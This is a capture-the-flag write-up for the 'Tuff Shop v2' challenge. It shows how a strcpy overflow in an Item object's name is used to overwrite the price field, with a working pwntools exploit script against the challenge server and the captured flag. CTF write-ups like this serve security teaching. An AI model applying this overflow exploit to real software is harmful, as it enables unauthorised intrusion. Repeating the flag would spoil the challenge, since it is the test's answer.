# Tuff Shop v2 
> Oh my god! You just haxxed the reallly tuff shop again! But this time you got in their secret admin system... Can you pull off the best six seven prank in this secret build?

Author: wintertia


## About the Challenge
This challenge gives a main elf which contains a shop. and we are asked to buy a flag in the shop

## How to Solve?

First we dissasemble this elf to know what actually it do, using this command
```
objdump -d main > main.asm
```
I found strcpy calls in _ZN4ItemC1EPKci (constructor) and _ZN4Item8editNameEv that call strcpy on the Item object's buffer—this indicates an infinite copy → potential overflow.
Look at the Item object's layout: the constructor writes mov %edx,0x40(%rax) → the price field is at offset 0x40 of the base object.

Here, I created an exploit file that uses the pwn tool to create an item (index 0), uses editName (which calls strcpy) to overflow the name to the byte at offset 0x40, changes that byte to a lowercase (e.g., ASCII '1' = 0x31) so that price <= aura, and then selects the buy option to trigger flag().

```
from pwn import *
p=remote('intersec.hcs-team.com',10118)
def m(n):
    p.recvuntil(b'>',timeout=5)
    p.sendline(str(n).encode())
m(1)
p.sendline(b'ITEM')
m(2)
p.sendline(b'0')
p.sendline(b'A'*0x40+b'1')
m(4)
p.sendline(b'0')
print(p.recvall(timeout=5).decode(errors='ignore'))

```

<img width="786" height="574" alt="image" src="https://github.com/user-attachments/assets/62108305-fb7a-4ec2-a8b1-2ba98046221d" />


Boom. we got the flag

## Flag
```
HCS{omg_h343p_g00att_s0_tUFFFF_<3_ffd393e9-3dce-4a6b-beb3-3101c450c914}
```
